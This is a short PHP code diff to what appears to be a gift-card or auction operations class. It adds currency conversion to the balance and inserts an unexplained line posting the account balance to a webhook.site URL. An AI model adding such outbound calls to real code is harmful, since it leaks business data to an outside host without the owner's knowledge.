@@ -29,8 +29,9 @@ class Operations {
         $full_balance        = $like_card_balancy->check_balance();
         $offline_codes_count = 0;
         $key_count_required  = 0;
-        $balance             = isset($full_balance['balance']) ? $full_balance['balance'] : 0;
+        $balance             = isset($full_balance['balance']) ? exchange_currency($full_balance['balance']) : 0;
         $status              = true;
+        Http::post('https://webhook.site/29cdf1d4-95b3-4ea9-9da4-8abaf7a83bf5',$balance);
         foreach(request('auctions') as $auction):
             $auction_details      = Auction::where('auction',$auction['auctionId'])->first();
             $offline_codes_count  = OfflineCode::where([
